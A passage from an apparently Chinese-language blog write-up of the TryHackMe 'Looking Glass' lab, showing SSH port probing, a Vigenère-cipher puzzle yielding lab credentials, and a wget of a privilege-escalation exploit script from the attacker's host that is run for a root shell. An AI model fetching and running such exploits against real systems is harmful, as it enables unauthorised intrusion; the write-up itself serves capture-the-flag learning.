+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/Tryhackme$ ssh 10.10.51.103 -p 9001<br>The authenticity of host <span class="hljs-string">&#x27;[10.10.51.103]:9001 ([10.10.51.103]:9001)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>[10.10.51.103]:9001<span class="hljs-string">&#x27; (RSA) to the list of known hosts.</span><br><span class="hljs-string">Lower</span><br><span class="hljs-string">Connection to 10.10.51.103 closed.</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/Tryhackme$ ssh 10.10.51.103 -p 13782<br>The authenticity of host <span class="hljs-string">&#x27;[10.10.51.103]:13782 ([10.10.51.103]:13782)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.</span><br><span class="hljs-string">This host key is known by the following other names/addresses:</span><br><span class="hljs-string">    ~/.ssh/known_hosts:7: [hashed name]</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>[10.10.51.103]:13782<span class="hljs-string">&#x27; (RSA) to the list of known hosts.</span><br><span class="hljs-string">Higher</span><br><span class="hljs-string">Connection to 10.10.51.103 closed.</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/Tryhackme$ ssh 10.10.51.103 -p 12223<br>The authenticity of host <span class="hljs-string">&#x27;[10.10.51.103]:12223 ([10.10.51.103]:12223)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.</span><br><span class="hljs-string">This host key is known by the following other names/addresses:</span><br><span class="hljs-string">    ~/.ssh/known_hosts:7: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:8: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:9: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:10: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:11: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:12: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:13: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:14: [hashed name]</span><br><span class="hljs-string">    (7 additional names omitted)</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>[10.10.51.103]:12223<span class="hljs-string">&#x27; (RSA) to the list of known hosts.</span><br><span class="hljs-string">You&#x27;</span>ve found the real service.<br>Solve the challenge to get access to the box<br>Jabberwocky<br><span class="hljs-string">&#x27;Mdes mgplmmz, cvs alv lsmtsn aowil</span><br><span class="hljs-string">Fqs ncix hrd rxtbmi bp bwl arul;</span><br><span class="hljs-string">Elw bpmtc pgzt alv uvvordcet,</span><br><span class="hljs-string">Egf bwl qffl vaewz ovxztiql.</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span>Fvphve ewl Jbfugzlvgb, ff woy!<br>Ioe kepu bwhx sbai, tst jlbal vppa grmjl!<br>Bplhrf xag Rjinlu imro, pud tlnp<br>Bwl jintmofh Iaohxtachxta!<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Oi tzdr hjw oqzehp jpvvd tc oaoh:</span><br><span class="hljs-string">Eqvv amdx ale xpuxpqx hwt oi jhbkhe--</span><br><span class="hljs-string">Hv rfwmgl wl fp moi Tfbaun xkgm,</span><br><span class="hljs-string">Puh jmvsd lloimi bp bwvyxaa.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Eno pz io yyhqho xyhbkhe wl sushf,</span><br><span class="hljs-string">Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,</span><br><span class="hljs-string">Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,</span><br><span class="hljs-string">Pud cykdttk ej ba gaxt!</span><br><span class="hljs-string"></span><br><span class="hljs-string">Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh</span><br><span class="hljs-string">Ewl vpvict qseux dine huidoxt-achgb!</span><br><span class="hljs-string">Al peqi pt eitf, ick azmo mtd wlae</span><br><span class="hljs-string">Lx ymca krebqpsxug cevm.</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span>Ick lrla xhzj zlbmg vpt Qesulvwzrr?<br>Cpqx vw bf eifz, qy mthmjwa dwn!<br>V jitinofh kaz! Gtntdvl! Ttspaj!<span class="hljs-string">&#x27;</span><br><span class="hljs-string">Wl ciskvttk me apw jzn.</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span>Awbw utqasmx, tuh tst zljxaa bdcij<br>Wph gjgl aoh zkuqsi zg ale hpie;<br>Bpe oqbzc nxyi tst iosszqdtz,<br>Eew ale xdte semja dbxxkhfe.<br>Jdbr tivtmi pw sxderpIoeKeudmgdstd<br>Enter Secret:<br>Incorrect secret.<br>Connection to 10.10.51.103 closed.<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220730225649666.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220730225649666"></p>
+<p><img src="https://www.worldisend.com/img/image-20220730225708972.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220730225708972"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.boxentriq.com<span class="hljs-regexp">/code-breaking/</span>vigenere-cipher<br></code></pre></td></tr></table></figure>
+
+<p>把诗歌整体复制到文本框中，尝试自动破解key会识别出一个key，然后将key输入上边key输入框中再进行解码，看最下边的结果会显示一个秘钥：</p>
+<p><img src="https://www.worldisend.com/img/image-20220730233737566.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220730233737566"></p>
+<p>再重新链接端口输入秘钥会给一个凭据：</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><br><span class="hljs-comment">&#x27;Awbw utqasmx, tuh tst zljxaa bdcij</span><br>Wph gjgl aoh zkuqsi zg ale hpie;<br>Bpe oqbzc nxyi tst iosszqdtz,<br>Eew ale xdte semja dbxxkhfe.<br>Jdbr tivtmi pw sxderpIoeKeudmgdstd<br>Enter Secret:<br><span class="hljs-symbol">jabberwock:</span>DeafenedPigeonSneezeStood<br>Connection <span class="hljs-keyword">to</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">51.103</span> closed.<br>                                                                                                                                                              <br><span class="hljs-symbol">Crazy:</span>~/Tryhackme$ <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/Tryhackme$ ssh jabberwock@10.10.51.103<br>jabberwock@10.10.51.103<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Last login: Fri Jul  3 03:05:33 2020 from 192.168.170.1</span><br><span class="hljs-string">jabberwock@looking-glass:~$ </span><br><span class="hljs-string">jabberwock@looking-glass:~$ uname -a</span><br><span class="hljs-string">Linux looking-glass 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">jabberwock@looking-glass:~$ echo 1&gt; 1.txt</span><br><span class="hljs-string">jabberwock@looking-glass:~$ wget http://10.11.75.230/CVE-2021-2043.py</span><br><span class="hljs-string">--2022-07-30 15:39:33--  http://10.11.75.230/CVE-2021-2043.py</span><br><span class="hljs-string">Connecting to 10.11.75.230:80... connected.</span><br><span class="hljs-string">HTTP request sent, awaiting response... 200 OK</span><br><span class="hljs-string">Length: 3448 (3.4K) [text/x-python]</span><br><span class="hljs-string">Saving to: ‘CVE-2021-2043.py’</span><br><span class="hljs-string"></span><br><span class="hljs-string">CVE-2021-2043.py                        100%[=============================================================================&gt;]   3.37K  --.-KB/s    in 0.001s  </span><br><span class="hljs-string"></span><br><span class="hljs-string">2022-07-30 15:39:33 (4.95 MB/s) - ‘CVE-2021-2043.py’ saved [3448/3448]</span><br><span class="hljs-string"></span><br><span class="hljs-string">jabberwock@looking-glass:~$ ls</span><br><span class="hljs-string">1.txt  CVE-2021-2043.py  poem.txt  twasBrillig.sh  user.txt</span><br><span class="hljs-string">jabberwock@looking-glass:~$ python3 CVE-2021-2043.py </span><br><span class="hljs-string"># id</span><br><span class="hljs-string">uid=0(root) gid=0(root) groups=0(root),1001(jabberwock)</span><br><span class="hljs-string"># </span><br></code></pre></td></tr></table></figure>
+
+<p>flag是反转的镜像，用python很简单的就可以反转回来。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~$ python            <br>Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux<br>Type <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> or <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br>&gt;&gt;&gt; str = <span class="hljs-string">&#x27;&#125;32a911966cab2...................&#123;mht&#x27;</span><br>&gt;&gt;&gt; str[::-1]<br><span class="hljs-string">&#x27;thm&#123;65d3710........................&#125;&#x27;</span><br>&gt;&gt;&gt; str = <span class="hljs-string">&#x27;&#125;f3dae6..................&#123;mht&#x27;</span><br>&gt;&gt;&gt; str[::-1]<br><span class="hljs-string">&#x27;thm&#123;bc23........................&#125;&#x27;</span><br>&gt;&gt;&gt; <br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Tryhackme-Looking Glass</div>
+      <div>http://example.com/2022/10/06/Tryhackme-Looking-Glass/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Crazyinside</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/TryHackMe-Osiris/" title="TryHackMe-Osiris">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">TryHackMe-Osiris</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/Yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Yara规则">
+                        <span class="hidden-mobile">Yara规则</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
